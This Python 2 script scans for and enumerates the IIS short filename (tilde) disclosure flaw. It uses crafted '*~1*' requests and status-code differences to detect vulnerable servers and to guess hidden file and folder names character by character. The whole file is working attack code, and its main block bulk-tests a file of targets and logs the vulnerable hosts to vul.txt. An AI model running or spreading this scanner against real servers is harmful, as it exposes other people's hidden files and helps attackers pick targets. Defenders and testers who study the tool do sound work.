# encoding=gbk
# An IIS short_name scanner   my[at]lijiejie.com  http://www.lijiejie.com    

import sys
import httplib
import urlparse
import string
import threading
import Queue
import time
import string


class Scanner():
    def __init__(self, target):
        self.target = target
        self.scheme, self.netloc, self.path, params, query, fragment = \
                     urlparse.urlparse(target)
        if self.path[-1:] != '/':    # ends with slash
            self.path += '/'
        self.payloads = list('abcdefghijklmnopqrstuvwxyz0123456789_-')
        self.files = []
        self.dirs = []
        self.queue = Queue.Queue()
        self.lock = threading.Lock()
        self.threads = []

    
    def _conn(self):
        try:
            if self.scheme == 'https':
                conn = httplib.HTTPSConnection(self.netloc)
            else:
                conn = httplib.HTTPConnection(self.netloc)
            return conn
        except Exception, e:
            print '[Exception in function _conn]', e
            return None

    # fetch http response status code
    def _get_status(self, path):
        try:
            conn = self._conn()
            conn.request('GET', path)
            status = conn.getresponse().status
            conn.close()
            return status
        except Exception, e:
            raise Exception('[Exception in function _get_status] %s' % str(e) )

    # test weather the server is vulerable
    def is_vul(self):
        try:
            status_1 = self._get_status(self.path + '/*~1****/a.aspx')    # an existed file/folder
            status_2 = self._get_status(self.path + '/l1j1e*~1****/a.aspx')    # not existed file/folder
            if status_1 == 404 and status_2 == 400:
                return True
            return False
        except Exception, e:
            raise Exception('[Exception in function is_val] %s' % str(e) )

    def run(self):
        # start from root path
        for payload in self.payloads:
            self.queue.put( (self.path + payload, '****') )    # filename, extention
        for i in range(10):  
            t = threading.Thread(target=self._scan_worker)
            self.threads.append(t)
            t.start()

    def report(self):
        for t in self.threads:
            t.join()
        self._print('-'* 64)
        for d in self.dirs:
            self._print('Dir:  ' + d)
        for f in self.files:
            self._print('File: ' + f)
        self._print('-'*64)
        self._print('%d Directories, %d Files found in toal' % (len(self.dirs), len(self.files)) )
        

    def _print(self, msg):
        self.lock.acquire()
        print msg
        self.lock.release()

    def _scan_worker(self):
        while True:
            try:
                url, ext = self.queue.get(timeout=3)
                status = self._get_status(url + '*~1' + ext + '/1.aspx')
                if status == 404:
                    self._print('Found ' +  url + ext + '\t[scan in progress]')

                    if len(url) - len(self.path)< 6:    # enum first 6 chars only
                        for payload in self.payloads:
                            self.queue.put( (url + payload, ext) )
                    else:
                        if ext == '****':    # begin to scan extention
                            for payload in string.ascii_lowercase:
                                self.queue.put( (url, '*' + payload + '**') )
                            self.queue.put( (url,'') )    # also it can be a folder
                        elif ext.count('*') == 3:
                            for payload in string.ascii_lowercase:
                                self.queue.put( (url, '*' + ext[1] + payload + '*') )
                        elif ext.count('*') == 2:
                            for payload in string.ascii_lowercase:
                                self.queue.put( (url, '*' + ext[1] + ext[2] + payload ) )
                        elif ext == '':
                            self.dirs.append(url + '~1')
                            self._print('Found Dir ' +  url + '~1\t[Done]')

                        elif ext.count('*') == 1:
                            self.files.append(url + '~1.' + ext[1:])
                            self._print('Found File ' + url + '~1.' + ext[1:] + '\t[Done]')
            except Exception,e:
                break
            


if len(sys.argv) == 1:
    print 'Usage: %s target' % sys.argv[0]
    sys.exit()

file = sys.argv[1]
fobj = open(file,'r')
fileHandle = open('vul.txt','a+')  
for target in fobj:
      print target.strip()
      s = Scanner(target.strip())
      if not s.is_vul():
          print 'NO vulerable'
          #sys.exit(0)
      else:
	      fileHandle.write(target)
	      print 'server is vulerable'
#s.run()
#s.report()



    



